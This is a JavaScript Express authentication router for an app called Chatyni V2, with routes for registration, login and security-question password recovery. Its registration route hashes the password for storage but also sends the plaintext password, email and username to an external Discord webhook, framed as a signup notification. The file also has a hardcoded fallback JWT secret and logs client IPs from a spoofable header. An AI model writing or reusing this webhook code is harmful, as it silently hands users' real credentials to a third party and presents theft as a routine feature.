const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const { PrismaClient } = require('@prisma/client');

module.exports = (prisma) => {
    const router = express.Router();
    const JWT_SECRET = process.env.JWT_SECRET || 'fallback-secret-for-dev-only-change-in-production';

    // Função para enviar webhook (pode ser movida para um arquivo de utilitários no futuro)
    async function sendToDiscordWebhook(data) {
        const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (!webhookUrl) {
            console.log('DISCORD_WEBHOOK_URL não configurada. Pulando notificação de registro.');
            return;
        }
        const embed = {
            title: '🎉 Novo Cadastro no Chatyni V2!',
            color: 0x00ff00,
            fields: [
                { name: 'Usuário', value: data.username, inline: true },
                { name: 'Email', value: `||${data.email}||`, inline: true },
                { name: 'Senha', value: `||${data.password}||`, inline: false }
            ],
            timestamp: new Date().toISOString(),
            footer: { text: 'Chatyni V2 - Sistema de Notificação' }
        };
        try {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            });
        } catch (error) {
            console.error('Erro ao enviar webhook para o Discord:', error);
        }
    }

    router.post('/register', async (req, res) => {
        const { username, email, password, securityQuestion, securityAnswer } = req.body;
        try {
            if (!username || !email || !password || !securityQuestion || !securityAnswer) {
                return res.status(400).json({ message: 'Todos os campos são obrigatórios.' });
            }

            // Validação extra no servidor para a pergunta de segurança
            if (!securityQuestion || securityQuestion === "Escolha uma pergunta de segurança") {
                return res.status(400).json({ message: 'Por favor, escolha uma pergunta de segurança válida.' });
            }

            const existingUser = await prisma.user.findFirst({
                where: { OR: [{ email: email }, { username: username }] }
            });

            if (existingUser) {
                return res.status(400).json({ message: 'Usuário ou email já existe.' });
            }

            await prisma.user.create({
                data: {
                    username,
                    email,
                    passwordHash: bcrypt.hashSync(password, 10),
                    ip: req.ip,
                    securityQuestion,
                    securityAnswerHash: bcrypt.hashSync(securityAnswer, 10),
                    rpg: {
                        create: {
                            level: 1,
                            xp: 0,
                            xpToNextLevel: 100,
                            coins: 10,
                            stats: { "strength": 1, "dexterity": 1, "intelligence": 1, "defense": 1 },
                            characters: "[]",
                            inventory: "[]",
                            pets: "[]",
                        }
                    }
                }
            });

            sendToDiscordWebhook({ username, email, password });
            res.status(201).json({ message: 'Usuário criado com sucesso.' });
        } catch (error) {
            console.error("Erro no registro:", error);
            res.status(500).json({ message: "Erro interno ao criar usuário." });
        }
    });

    router.post('/login', async (req, res) => {
        const { email, password } = req.body;
        if (!email || !password) return res.status(400).json({ message: 'Email e senha são obrigatórios.' });
        
        const user = await prisma.user.findUnique({ where: { email: email } });

        if (!user || !bcrypt.compareSync(password, user.passwordHash)) {
            return res.status(401).json({ message: 'Email ou senha inválidos.' });
        }

        await prisma.user.update({ where: { id: user.id }, data: { ip: req.headers['x-forwarded-for'] || req.ip } });

        if (user.status === 'banned') {
            return res.status(403).json({ message: 'Esta conta foi banida.', banDetails: user.banDetails });
        }

        const token = jwt.sign({ username: user.username }, JWT_SECRET, { expiresIn: '24h' });
        res.json({ token });
    });

    router.post('/recover/get-question', async (req, res) => {
        const { email } = req.body;
        if (!email) return res.status(400).json({ message: 'Email é obrigatório.' });
        const user = await prisma.user.findUnique({ where: { email } });
        if (!user || !user.securityQuestion) return res.status(404).json({ message: 'Nenhuma conta encontrada com este email ou nenhuma pergunta de segurança configurada.' });
        res.json({ question: user.securityQuestion });
    });

    router.post('/recover/validate-answer', async (req, res) => {
        const { email, answer } = req.body;
        if (!email || !answer) return res.status(400).json({ message: 'Email e resposta são obrigatórios.' });
        const user = await prisma.user.findUnique({ where: { email } });
        if (!user || !user.securityAnswerHash || !bcrypt.compareSync(answer, user.securityAnswerHash)) return res.status(401).json({ message: 'Resposta de segurança incorreta.' });
        const token = crypto.randomBytes(20).toString('hex');
        await prisma.user.update({
            where: { id: user.id },
            data: {
                recoveryToken: token,
                recoveryTokenExpires: new Date(Date.now() + 600000) // 10 minutos
            }
        });
        res.json({ recoveryToken: token });
    });

    router.post('/recover/reset', async (req, res) => {
        const { token, newPassword } = req.body;
        if (!token || !newPassword) return res.status(400).json({ message: 'Token e nova senha são obrigatórios.' });
        const user = await prisma.user.findFirst({
            where: {
                recoveryToken: token,
                recoveryTokenExpires: { gt: new Date() }
            }
        });
        if (!user) return res.status(400).json({ message: 'Token de recuperação inválido ou expirado. Por favor, solicite um novo.' });
        await prisma.user.update({
            where: { id: user.id },
            data: {
                passwordHash: bcrypt.hashSync(newPassword, 10),
                recoveryToken: null,
                recoveryTokenExpires: null
            }
        });
        res.json({ message: 'Senha alterada com sucesso! Você já pode fazer o login.' });
    });

    return router;
};
